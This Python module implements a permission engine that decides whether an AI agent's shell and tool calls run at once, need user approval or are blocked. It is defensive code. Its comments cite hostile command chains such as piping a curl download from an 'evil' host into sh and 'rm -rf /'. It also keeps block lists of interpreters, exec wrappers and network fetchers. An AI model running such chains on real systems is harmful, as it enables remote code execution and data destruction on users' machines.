"""Permission engine — glob-pattern rules with ALWAYS/ASK/NEVER levels.

Each rule maps a pattern like "bash:himalaya*list*" to a permission level.
The engine checks tool calls against these patterns to decide whether to execute
immediately, ask the user for approval, or block entirely.
"""

from __future__ import annotations

import asyncio
import fnmatch
import logging
import sqlite3
import uuid
from pathlib import Path
from typing import TypedDict

log = logging.getLogger(__name__)


class PermissionLevel:
    ALWAYS = "ALWAYS"  # Pre-approved, execute without asking
    ASK = "ASK"  # Pause and ask the user for approval
    NEVER = "NEVER"  # Block entirely


# Programs that make a generalized "<prefix>*" rule unsafe — see _rule_pattern.
# Interpreters/shells: a trailing `*` becomes `-c <code>` = arbitrary execution.
_INTERPRETERS = {
    "python",
    "python2",
    "python3",
    "pypy",
    "pypy3",
    "perl",
    "ruby",
    "node",
    "deno",
    "bun",
    "bash",
    "sh",
    "zsh",
    "fish",
    "dash",
    "ksh",
    "php",
    "lua",
    "luajit",
    "rscript",
    "osascript",
    "awk",
    "gawk",
    "tclsh",
    "ed",
    "eval",
}
# Exec wrappers: run whatever follows, and their filler args can push an
# interpreter past _rule_pattern's token cap (`env A=1 python3 -c …`).
# `find` counts too: `-exec cmd {} +` runs an arbitrary command with no shell
# control char, so a generalized `find .*` rule would auto-approve it.
_EXEC_WRAPPERS = {
    "env",
    "find",
    "sudo",
    "doas",
    "su",
    "xargs",
    "nohup",
    "nice",
    "ionice",
    "time",
    "timeout",
    "watch",
    "setsid",
    "stdbuf",
    "unbuffer",
    "flock",
    "chroot",
    "script",
}
# Net fetchers: a trailing `*` is any path/host (scheme-less, so the `://` break
# in _rule_pattern doesn't catch them).
_NET_FETCHERS = {"curl", "wget"}

# Shell control characters that can chain, redirect, or substitute a SECOND
# command. bash executes the whole string via /bin/sh -c, so a wildcard
# ("…*") rule must never auto-approve a command containing any of these — the `*`
# would blindly cover an unapproved tail (`jq .name; curl evil | sh`). Guarded in
# check(); _rule_pattern also refuses to generalize such a command in the first place.
_SHELL_CONTROL = frozenset(";|&$`<>()\n")


def _has_shell_control(command: str) -> bool:
    """True if a command string contains a shell chaining/redirect/substitution char."""
    return any(c in _SHELL_CONTROL for c in command)


# Default rules — read operations are ALWAYS, write operations ASK, destructive NEVER.
DEFAULT_RULES: dict[str, str] = {
    # Read operations — safe by default
    "bash:himalaya*list*": "ALWAYS",
    "bash:himalaya*read*": "ALWAYS",
    "bash:himalaya*envelope*": "ALWAYS",
    "bash:himalaya*folder*": "ALWAYS",
    "bash:python3 /app/tools/contacts.py*": "ALWAYS",
    "bash:python3 tools/contacts.py*": "ALWAYS",
    "bash:python3 /app/tools/calendar_read.py*": "ALWAYS",
    "bash:python3 tools/calendar_read.py*": "ALWAYS",
    # wacli read operations — all pre-approved
    "bash:wacli*messages*": "ALWAYS",
    "bash:wacli*contacts search*": "ALWAYS",
    "bash:wacli*contacts show*": "ALWAYS",
    "bash:wacli*chats*": "ALWAYS",
    "bash:wacli*groups list*": "ALWAYS",
    "bash:wacli*groups info*": "ALWAYS",
    "bash:wacli*sync*": "ALWAYS",
    "bash:wacli*search*": "ALWAYS",
    # wacli write operations — require approval
    "bash:wacli*contacts refresh*": "ASK",
    "bash:wacli*contacts alias*": "ASK",
    "bash:wacli*contacts tags*": "ASK",
    "bash:wacli*groups refresh*": "ASK",
    "bash:wacli*groups rename*": "ASK",
    "bash:wacli*groups participants*": "ASK",
    "bash:wacli*groups invite*": "ASK",
    "bash:wacli*groups join*": "ASK",
    "bash:wacli*groups leave*": "ASK",
    "bash:wacli*send*": "ASK",
    # Block direct access to wacli's internal SQLite databases
    "bash:sqlite3*wacli*": "NEVER",
    "bash:sqlite3*.wacli*": "NEVER",
    "bash:sqlite3*/app/data/memory.db*SELECT*": "ALWAYS",
    "bash:sqlite3*/app/data/memory.db*INSERT*": "ALWAYS",
    "bash:sqlite3*/app/data/memory.db*UPDATE*": "ALWAYS",
    "bash:sqlite3*/app/data/memory.db*DELETE*": "ALWAYS",
    "bash:sqlite3*data/memory.db*SELECT*": "ALWAYS",
    "bash:sqlite3*data/memory.db*INSERT*": "ALWAYS",
    "bash:sqlite3*data/memory.db*UPDATE*": "ALWAYS",
    "bash:sqlite3*data/memory.db*DELETE*": "ALWAYS",
    "bash:python3 /app/tools/jobs.py list*": "ALWAYS",
    "bash:python3 /app/tools/jobs.py show*": "ALWAYS",
    "bash:python3 tools/jobs.py list*": "ALWAYS",
    "bash:python3 tools/jobs.py show*": "ALWAYS",
    "bash:python3 /app/tools/jobs.py create*": "ASK",
    "bash:python3 /app/tools/jobs.py edit*": "ASK",
    "bash:python3 /app/tools/jobs.py remove*": "ASK",
    "bash:python3 /app/tools/jobs.py cancel*": "ASK",
    "bash:python3 tools/jobs.py create*": "ASK",
    "bash:python3 tools/jobs.py edit*": "ASK",
    "bash:python3 tools/jobs.py remove*": "ASK",
    "bash:python3 tools/jobs.py cancel*": "ASK",
    "bash:python3 /app/tools/skills.py list*": "ALWAYS",
    "bash:python3 /app/tools/skills.py show*": "ALWAYS",
    "bash:python3 /app/tools/skills.py upsert*": "ASK",
    "bash:python3 /app/tools/skills.py delete*": "ASK",
    "bash:python3 tools/skills.py list*": "ALWAYS",
    "bash:python3 tools/skills.py show*": "ALWAYS",
    "bash:python3 tools/skills.py upsert*": "ASK",
    "bash:python3 tools/skills.py delete*": "ASK",
    "bash:jq*": "ALWAYS",
    "bash:curl*wttr.in*": "ALWAYS",
    "bash:w3m*": "ALWAYS",
    "bash:pandoc*": "ALWAYS",
    "bash:pdftotext*": "ALWAYS",
    "bash:rg*": "ALWAYS",
    "bash:yt-dlp*": "ALWAYS",
    "bash:cal*": "ALWAYS",
    # Common read-only Unix commands (#148) — noisy to ASK for on every fresh
    # agent. Safe because the check() shell-control guard still blocks any
    # wildcard auto-approval of a command carrying ; | & $() ` < > (redirects,
    # chaining, substitution), so `cat >x`, `date; rm -rf /`, `echo x|sh` all
    # still ASK. Deliberately EXCLUDED: `env` (exec-wrapper — `env A=1 python3 -c
    # …` runs arbitrary code with no shell-control char, so the guard can't catch
    # it; it stays ASK, same as xargs/sudo). `tr` uses a `tr *` pattern, not
    # `tr*`, so it can't bleed onto destructive `truncate`.
    "bash:cat*": "ALWAYS",
    "bash:ls*": "ALWAYS",
    "bash:echo*": "ALWAYS",
    "bash:head*": "ALWAYS",
    "bash:tail*": "ALWAYS",
    "bash:date*": "ALWAYS",
    "bash:pwd*": "ALWAYS",
    "bash:whoami*": "ALWAYS",
    "bash:id*": "ALWAYS",
    "bash:uname*": "ALWAYS",
    "bash:hostname*": "ALWAYS",
    "bash:which*": "ALWAYS",
    "bash:wc*": "ALWAYS",
    "bash:sort*": "ALWAYS",
    "bash:uniq*": "ALWAYS",
    "bash:cut*": "ALWAYS",
    "bash:tr *": "ALWAYS",
    "bash:du*": "ALWAYS",
    "bash:df*": "ALWAYS",
    "bash:file*": "ALWAYS",
    "bash:basename*": "ALWAYS",
    "bash:dirname*": "ALWAYS",
    "bash:printenv*": "ALWAYS",
    # cp writes files (into the workspace) — treat like other write ops: ask first.
    "bash:cp*": "ASK",
    "bash:git*log*": "ALWAYS",
    "bash:git*status*": "ALWAYS",
    "bash:git*diff*": "ALWAYS",
    "bash:git*show*": "ALWAYS",
    "bash:git*branch*": "ALWAYS",
    "bash:gh*list*": "ALWAYS",
    "bash:gh*view*": "ALWAYS",
    "bash:gh*status*": "ALWAYS",
    "bash:gh*api*": "ALWAYS",
    "bash:gh*search*": "ALWAYS",
    "bash:gh*issue create*": "ASK",
    "bash:gh*pr create*": "ASK",
    "bash:gh*release create*": "ASK",
    # Browser automation — reading is safe, acting (click/fill/submit) asks.
    # Per-domain rules work because every command carries `--url`, e.g. add
    # "bash:*browser.py act*github.com*": "ALWAYS" via the admin UI.
    "bash:*browser.py read*": "ALWAYS",
    "bash:*browser.py screenshot*": "ALWAYS",
    "bash:*browser.py profiles*": "ALWAYS",
    "bash:*browser.py act*": "ASK",
    # explore self-drives autonomously under one approval (#2); always confirm.
    "bash:*browser.py explore*": "ASK",
    "bash:git*push*": "ASK",
    "bash:git*commit*": "ASK",
    "web_search": "ALWAYS",
    "recall_memory": "ALWAYS",
    "remember": "ALWAYS",  # local memory write, low-stakes — no prompt (#13)
    # Skill bodies live in the skills DB — reading them must never prompt (#178).
    "bash:sqlite3*skills.db*SELECT*": "ALWAYS",
    # Coding harness (#76) — reads pre-approved, writes ask (confined to the
    # configured workspace root regardless; see core/coding.py).
    "read": "ALWAYS",
    "write": "ASK",
    "edit": "ASK",
    # Write operations — ask first
    "send_email": "ASK",
    "reply_email": "ASK",
    "send_message": "ASK",
    # Reactions are cosmetic, carry no data, and can't exfiltrate — pre-approved
    # so a quick emoji ack never interrupts the user with a prompt (#70).
    "set_reaction": "ALWAYS",
    "create_calendar_event": "ASK",
    "create_contact": "ASK",
    "bash:himalaya*send*": "ASK",
    "bash:himalaya*delete*": "ASK",
    "bash:himalaya*move*": "ASK",
    "schedule_task": "ASK",
    "manage_jobs": "ASK",
    # Delegating to a subagent is approved once per spawn; the subagent then runs
    # autonomously within its narrowed scope (system semantics), like a job.
    "spawn_subagent": "ASK",
    # Publishing a web artifact is now just a write under {workspace}/artifacts/
    # (issue #82) — it inherits the write ASK rule, no separate entry.
    # Dangerous — never allow
    "bash:sqlite3*DROP*": "NEVER",
    "bash:sqlite3*ALTER*": "NEVER",
    # Read-only contacts lookup — safe, high-frequency.
    "search_contacts": "ALWAYS",
}


# Rules are keyed by (scope, pattern): scope = agent/agent slug, "" = the
# global default every agent falls back to (#100). SQLite can't add a column
# to an existing primary key, so the migration in _ensure_schema rebuilds the
# old single-scope table into this shape with existing rules as the default.
_CREATE_PERMISSIONS = (
    "CREATE TABLE IF NOT EXISTS permissions ("
    "scope TEXT NOT NULL DEFAULT '', pattern TEXT NOT NULL, level TEXT NOT NULL, "
    "created_at DATETIME DEFAULT (datetime('now')), "
    "PRIMARY KEY (scope, pattern))"
)


class PermissionEngine:
    """Check tool actions against permission rules using glob patterns.

    Rules are scoped per agent/agent (#100): each agent slug has its own
    ruleset layered over the global default scope (``""``). ``self.rules`` is the
    default set (seeded from :data:`DEFAULT_RULES` + persisted ``scope=''`` rows);
    ``self.scoped`` holds each agent's overrides. An agent-specific rule wins
    over a default rule of the same pattern; everything else falls back.
    """

    def __init__(self, db_path: str = "data/config.db") -> None:
        self.db_path = db_path
        self.rules: dict[str, str] = dict(DEFAULT_RULES)
        # agent/agent slug → its own {pattern: level} overrides (#100).
        self.scoped: dict[str, dict[str, str]] = {}
        self._ready = False
        # Pending approval requests: request_id → PendingApproval
        self._pending: dict[str, PendingApproval] = {}
        # YOLO scopes (channels) with the approval prompt bypassed — see is_yolo.
        self._yolo: set[str] = set()
        self._load_persisted_rules()
        self._load_yolo()

    def _ensure_schema(self) -> None:
        if self._ready:
            return
        Path(self.db_path).parent.mkdir(parents=True, exist_ok=True)
        with sqlite3.connect(self.db_path) as db:
            cols = {row[1] for row in db.execute("PRAGMA table_info(permissions)").fetchall()}
            if cols and "scope" not in cols:
                # Pre-#100 table keyed by pattern only → rebuild with the composite
                # key, existing rules becoming the global default scope ("").
                # Drop any orphan from a prior interrupted migration so the rename
                # can't fail on startup.
                db.execute("DROP TABLE IF EXISTS permissions_legacy")
                db.execute("ALTER TABLE permissions RENAME TO permissions_legacy")
                db.execute(_CREATE_PERMISSIONS)
                db.execute(
                    "INSERT INTO permissions (scope, pattern, level, created_at) "
                    "SELECT '', pattern, level, created_at FROM permissions_legacy"
                )
                db.execute("DROP TABLE permissions_legacy")
            else:
                db.execute(_CREATE_PERMISSIONS)
            db.execute("CREATE TABLE IF NOT EXISTS yolo (scope TEXT PRIMARY KEY)")
            self._migrate_tool_renames(db)
        self._ready = True

    # Tool renames (#178): run_command→bash, read_file→read, write_file→write,
    # edit_file→edit; run_command_in_dir folded into bash; list_dir/grep/
    # load_skill/search_skills/list_skills removed. Persisted rules (owner-added
    # and auto-learned) must follow, or every learned approval is lost and stale
    # NEVER rails stop matching. Idempotent — a store with no legacy pattern is
    # untouched — so it can run on every boot.
    _LEGACY_RENAMES = {
        "read_file": "read",
        "write_file": "write",
        "edit_file": "edit",
        "run_command": "bash",
        "run_command_in_dir": "bash",
    }
    _LEGACY_DROPPED = frozenset({"list_dir", "grep", "load_skill", "search_skills", "list_skills"})

    @classmethod
    def _migrate_tool_renames(cls, db: sqlite3.Connection) -> None:
        rows = db.execute("SELECT scope, pattern, level FROM permissions").fetchall()
        for scope, pattern, level in rows:
            new = None
            if pattern.startswith("run_command:"):
                new = "bash:" + pattern[len("run_command:") :]
            elif pattern in cls._LEGACY_RENAMES:
                new = cls._LEGACY_RENAMES[pattern]
            elif pattern not in cls._LEGACY_DROPPED:
                continue
            db.execute("DELETE FROM permissions WHERE scope = ? AND pattern = ?", (scope, pattern))
            if new:
                db.execute(
                    "INSERT INTO permissions (scope, pattern, level) VALUES (?, ?, ?) "
                    "ON CONFLICT(scope, pattern) DO UPDATE SET level = excluded.level",
                    (scope, new, level),
                )

    def _load_persisted_rules(self) -> None:
        self._ensure_schema()
        with sqlite3.connect(self.db_path) as db:
            rows = db.execute("SELECT scope, pattern, level FROM permissions").fetchall()
        valid = (PermissionLevel.ALWAYS, PermissionLevel.ASK, PermissionLevel.NEVER)
        for scope, pattern, level in rows:
            if level not in valid:
                continue
            if scope:
                self.scoped.setdefault(scope, {})[pattern] = level
            else:
                self.rules[pattern] = level

    def _persist_rule(self, pattern: str, level: str, scope: str = "") -> None:
        self._ensure_schema()
        with sqlite3.connect(self.db_path) as db:
            db.execute(
                "INSERT INTO permissions (scope, pattern, level) VALUES (?, ?, ?) "
                "ON CONFLICT(scope, pattern) DO UPDATE SET level = excluded.level",
                (scope, pattern, level),
            )
            db.commit()

    def _effective_rules(self, scope: str = "") -> dict[str, str]:
        """The rules seen by ``scope``: agent overrides layered over the default.

        No scope (or an agent with no own rules) → the default set unchanged, so
        the hot ``check()`` path allocates nothing for the common case.
        """
        own = self.scoped.get(scope)
        if not scope or not own:
            return self.rules
        return {**self.rules, **own}

    def rules_for_scope(self, scope: str = "") -> dict[str, str]:
        """Rules OWNED by a scope (for the admin editor): the default set for
        ``""``, else just that agent's own overrides."""
        return self.rules if not scope else self.scoped.get(scope, {})

    def _load_yolo(self) -> None:
        self._ensure_schema()
        with sqlite3.connect(self.db_path) as db:
            rows = db.execute("SELECT scope FROM yolo").fetchall()
        self._yolo = {scope for (scope,) in rows}

    def set_yolo(self, scope: str, on: bool) -> None:
        """Turn the approval-bypass (YOLO) on/off for a scope (a channel name).

        A scope in YOLO has ASK actions auto-approved without a prompt. NEVER
        rules still hold — this is "act without asking", not "self-destruct".
        Persisted so the choice survives a restart until explicitly turned off.
        """
        self._ensure_schema()
        with sqlite3.connect(self.db_path) as db:
            if on:
                db.execute("INSERT OR IGNORE INTO yolo (scope) VALUES (?)", (scope,))
                self._yolo.add(scope)
            else:
                db.execute("DELETE FROM yolo WHERE scope = ?", (scope,))
                self._yolo.discard(scope)
            db.commit()
        log.warning("YOLO mode %s for scope %r", "ON" if on else "OFF", scope)

    def is_yolo(self, scope: str) -> bool:
        """True if the scope (channel) currently bypasses approval prompts."""
        return scope in self._yolo

    def _build_match_key(self, tool_name: str, params: dict | None = None) -> str:
        if tool_name == "bash" and params and "command" in params:
            return f"bash:{params['command']}"
        return tool_name

    @staticmethod
    def _rule_pattern(match_key: str) -> str:
        """Generalize a concrete command into a reusable glob rule for "always".

        Keeps the leading program/script/subcommand tokens (e.g.
        `python3 /app/tools/browser.py explore`) and wildcards the arguments, so
        approving once covers every later call of the same command shape. Stops at
        the first flag/URL/quoted/redirect token and caps at 3 tokens. Two guards
        keep the wildcard from re-opening an arbitrary-code/target hole: at least 2
        kept tokens are required, and none of the kept tokens may be an interpreter
        (as the last token), an exec-wrapper (anywhere), or a net fetcher (as the
        program) — see the inline note. Such commands keep their exact form and
        re-ask on the next distinct call. Non-bash keys are returned
        unchanged.
        """
        prefix = "bash:"
        if not match_key.startswith(prefix):
            return match_key
        # Never generalize a command that already contains shell operators — a
        # wildcard over `jq .name; evil` is meaningless and the tokenizer's
        # break-on-metachar only fires for standalone single-char tokens, so a
        # fused `;evil` / `$(evil)` would otherwise survive into the prefix.
        if _has_shell_control(match_key[len(prefix) :]):
            return match_key
        kept: list[str] = []
        for tok in match_key[len(prefix) :].split():
            if tok.startswith("-") or "://" in tok or tok[:1] in "\"'" or tok in "|<>;&":
                break
            kept.append(tok)
            if len(kept) == 3:
                break
        # Need program + subcommand (≥2 tokens) before wildcarding the rest.
        # A single kept token means the very next token was a flag/URL/quoted arg
        # (`python3 -c …`, `curl https://…`, `sed -n …`, `echo "…"`), and
        # generalizing to `python3*` / `curl*` would auto-approve arbitrary code or
        # any URL — turning one "always" click into a blanket bypass of the engine.
        # Keep the exact command instead; the next distinct invocation re-asks.
        if len(kept) < 2:
            return match_key
        # Content check, not just token count: wildcarding is unsafe whenever the
        # trailing `*` could still expand into arbitrary code or an arbitrary
        # target. That happens when the LAST kept token is an interpreter/shell
        # (its `*` becomes `-c <code>`); when the PROGRAM is an exec-wrapper
        # (env/sudo/xargs/… run whatever follows, and their filler args can push an
        # interpreter past the 3-token cap, e.g. `env A=1 python3 …`); or when the
        # program fetches the network (`curl host*` = any path on that host,
        # scheme-less so the `://` break above never fired). Keep those exact.
        # (Program-position, like the fetcher check, so a wrapper *word* appearing
        # as a benign argument — `npm run time` — isn't needlessly held exact.)
        bases = [tok.rsplit("/", 1)[-1] for tok in kept]
        if bases[-1] in _INTERPRETERS or bases[0] in _EXEC_WRAPPERS or bases[0] in _NET_FETCHERS:
            return match_key
        return prefix + " ".join(kept) + "*"

    @staticmethod
    def _may_autolearn(pattern: str) -> bool:
        """Whether a freshly-approved rule is specific enough to auto-persist.

        Auto-learning a rule from a single approval is only safe when the key
        names a specific command shape — a ``tool:subkey`` scope. A bare tool
        name (no ``:`` sub-scope, or an empty one) — ``bash`` when the
        command arg was missing, ``bash:`` when it was empty, or a whole
        tool like ``generate_image`` — would whitelist the ENTIRE tool and
        nullify the allowlist (issue #79). Refuse those: the action keeps
        asking. A rule that broad must be set deliberately via the admin UI,
        never learned from one click.
        """
        _, sep, rest = pattern.partition(":")
        return bool(sep and rest.strip())

    def match_key(self, tool_name: str, params: dict | None = None) -> str:
        """Public helper to build the match key for a tool call."""
        return self._build_match_key(tool_name, params)

    def is_write_action(self, tool_name: str, params: dict | None = None) -> bool:
        """Return True if a tool call is a write-like action.

        Write-like actions should prompt for permission each time. Read actions
        can be auto-approved after the first user confirmation.
        """
        if tool_name in {
            "send_email",
            "reply_email",
            "send_message",
            "create_calendar_event",
            "create_contact",
            "schedule_task",
            "manage_jobs",
            "spawn_subagent",
            "write",
            "edit",
        }:
            return True

        match_key = self._build_match_key(tool_name, params)
        if match_key.startswith("bash:"):
            command = match_key[len("bash:") :].strip().lower()
            for pattern, level in self.rules.items():
                if level != PermissionLevel.ASK:
                    continue
                if not pattern.startswith("bash:"):
                    continue
                if fnmatch.fnmatch(match_key, pattern):
                    return True
            if any(
                token in command
                for token in ("send", "delete", "move", "invite", "rename", "join", "leave")
            ):
                return True

        return False

    def check(self, tool_name: str, params: dict | None = None, scope: str = "") -> str:
        """Return the permission level for a tool call.

        Builds a match key like "bash:himalaya envelope list ..."
        and checks it against all rules. First match wins, with more
        specific (longer) patterns tried first.

        ``scope`` selects the agent/agent ruleset (#100): its own rules layer
        over the global default, so an agent can tighten or loosen an action
        without affecting others. Empty scope = the global default set.
        """
        match_key = self._build_match_key(tool_name, params)
        rules = self._effective_rules(scope)

        # A bash command carrying shell control chars (; | & $() ` < > newline) can
        # chain a SECOND, unapproved command through /bin/sh -c. Such a command may
        # be auto-approved only by an EXACT rule, never by a wildcard one whose `*`
        # would blindly cover the injected tail (`jq .name*` matching
        # `jq .name; curl evil | sh`). NEVER rules and exact ALWAYS still apply.
        guard_wildcard_allow = match_key.startswith("bash:") and _has_shell_control(
            match_key[len("bash:") :]
        )

        # Sort rules by pattern length descending so more specific rules match first
        for pattern in sorted(rules, key=len, reverse=True):
            if fnmatch.fnmatch(match_key, pattern):
                level = rules[pattern]
                if guard_wildcard_allow and level == PermissionLevel.ALWAYS and "*" in pattern:
                    continue  # a wildcard must not auto-approve a chained command
                return level

        # Default: ASK for unknown actions (safe fallback)
        return PermissionLevel.ASK

    def add_rule(self, pattern: str, level: str, scope: str = "") -> None:
        """Add or update a permission rule in ``scope`` (default = global)."""
        if level not in (PermissionLevel.ALWAYS, PermissionLevel.ASK, PermissionLevel.NEVER):
            raise ValueError(f"Invalid permission level: {level!r}")
        if scope:
            self.scoped.setdefault(scope, {})[pattern] = level
        else:
            self.rules[pattern] = level
        self._persist_rule(pattern, level, scope)
        log.info("Permission rule added [%s]: %s → %s", scope or "default", pattern, level)

    def learn_always_rule(
        self, match_key: str, *, generalize: bool = True, scope: str = ""
    ) -> None:
        """Persist an ALWAYS rule learned from a single user approval — but only
        when the key is specific enough to be safe (see :meth:`_may_autolearn`).

        ``generalize`` widens a concrete command into a ``<prog> <subcmd>*`` glob
        (the "always allow" button); leave it False to learn the exact command
        (read-action auto-approve). A degenerate/over-broad key is skipped so the
        action keeps asking instead of blanket-whitelisting the whole tool (#79).

        The rule is learned into ``scope`` (the approving agent), so its
        approval doesn't silently widen other agents. Skipped if the effective
        ruleset for that scope already covers it.
        """
        pattern = self._rule_pattern(match_key) if generalize else match_key
        if not self._may_autolearn(pattern):
            log.warning("Refusing to auto-learn over-broad ALWAYS rule from %r", match_key)
            return
        if pattern not in self._effective_rules(scope):
            self.add_rule(pattern, PermissionLevel.ALWAYS, scope)

    def remove_rule(self, pattern: str, scope: str = "") -> bool:
        """Remove a permission rule from ``scope`` if it exists."""
        target = self.rules if not scope else self.scoped.get(scope, {})
        existed = pattern in target
        if existed:
            del target[pattern]
            self._ensure_schema()
            with sqlite3.connect(self.db_path) as db:
                db.execute(
                    "DELETE FROM permissions WHERE scope = ? AND pattern = ?", (scope, pattern)
                )
                db.commit()
        return existed

    def create_approval_request(
        self, tool_name: str | None = None, params: dict | None = None, scope: str = ""
    ) -> tuple[str, asyncio.Future[str]]:
        """Create a pending approval request. Returns (request_id, future).

        The caller awaits the future. When the user approves/denies via
        a channel callback, resolve_approval() completes the future with
        one of ``"approved"``, ``"denied"``, or ``"skipped"``.

        ``scope`` is the agent that asked, so an "always allow" learns the rule
        into that agent's ruleset rather than the global default (#100).
        """
        request_id = uuid.uuid4().hex[:12]
        loop = asyncio.get_running_loop()
        future = loop.create_future()
        if tool_name is None:
            tool_name = "unknown"
        if params is None:
            params = {}
        self._pending[request_id] = {
            "future": future,
            "match_key": self._build_match_key(tool_name, params),
            "scope": scope,
        }
        return request_id, future

    def format_approval_message(self, tool_name: str, params: dict) -> str:
        return format_approval_message(tool_name, params)

    def resolve_approval(
        self,
        request_id: str,
        approved: bool,
        always_allow: bool = False,
        *,
        skipped: bool = False,
    ) -> bool:
        """Resolve a pending approval request. Returns False if not found.

        The future is resolved with a string: ``"approved"``, ``"denied"``,
        or ``"skipped"`` so callers can distinguish all three outcomes.
        """
        entry = self._pending.pop(request_id, None)
        if not entry:
            return False
        future = entry["future"]
        if future.done():
            return False
        if always_allow:
            match_key = entry.get("match_key")
            if isinstance(match_key, str):
                # Persist a GENERALIZED pattern, not the exact command — otherwise
                # "always" only ever matches that one verbatim invocation and the
                # next (different --url/--task/args) prompts again. See _rule_pattern.
                # A degenerate key (bare bash/generate_image) is refused so
                # one click can't whitelist the whole tool (#79).
                self.learn_always_rule(match_key, generalize=True, scope=entry.get("scope", ""))
        if skipped:
            future.set_result("skipped")
        elif approved:
            future.set_result("approved")
        else:
            future.set_result("denied")
        return True


class PendingApproval(TypedDict):
    future: asyncio.Future[str]
    match_key: str
    scope: str


def _preview(text: str, limit: int = 200) -> str:
    """Truncate a free-form field so it can't blow past Telegram's message cap.

    Approval prompts interpolate user/agent-supplied strings (a command, a
    message body). A `bash` command carrying a large heredoc would otherwise
    produce a multi-kilobyte prompt that fails to send (#80).
    """
    return text[:limit] + ("…" if len(text) > limit else "")


def format_approval_message(tool_name: str, params: dict) -> str:
    """Format a human-readable approval prompt for a tool call."""
    if tool_name == "send_email":
        to = params.get("to", "?")
        subject = params.get("subject", "?")
        return f"Send email to {to}\nSubject: {subject}"
    if tool_name == "reply_email":
        # account is optional now — agent-routed when omitted (#110).
        account = params.get("account") or "the agent's default account"
        msg_id = params.get("message_id", "?")
        return f"Reply to message {msg_id} on {account}"
    if tool_name == "send_message":
        channel = params.get("channel", "?")
        to = params.get("to", "?")
        text = params.get("text", "")
        return f"Send {channel} message to {to}\n{_preview(text, 100)}"
    if tool_name == "create_calendar_event":
        summary = params.get("summary", "?")
        start = params.get("start", "?")
        return f"Create event: {summary}\nAt: {start}"
    if tool_name == "create_contact":
        name = params.get("name", "?")
        account = params.get("account") or "the default contacts account"
        return f"Add contact: {name}\nTo: {account}"
    if tool_name == "schedule_task":
        task = params.get("task", "?")
        run_at = params.get("run_at", "?")
        return f"Schedule task at {run_at}\n{task}"
    if tool_name == "manage_jobs":
        action = params.get("action", "?")
        if action == "create":
            task = params.get("task", "?")
            cron = params.get("cron")
            run_at = params.get("run_at")
            schedule = f"cron: {cron}" if cron else f"once at {run_at}" if run_at else "?"
            return f"Create scheduled job ({schedule})\n{task}"
        if action == "cancel":
            job_id = params.get("job_id", "?")
            return f"Cancel scheduled job: {job_id}"
        if action == "list":
            return "List all scheduled jobs"
        return f"Manage jobs: {action}"
    if tool_name == "bash":
        cmd = _preview(params.get("command", "?"))
        purpose = params.get("purpose", "")
        workdir = params.get("workdir", "")
        head = f"Run in {workdir}: {cmd}" if workdir else f"Run command: {cmd}"
        return head + (f"\n({purpose})" if purpose else "")
    if tool_name == "write":
        return f"Write file: {params.get('path', '?')}"
    if tool_name == "edit":
        return f"Edit file: {params.get('path', '?')}"
    return f"{tool_name}: {params}"
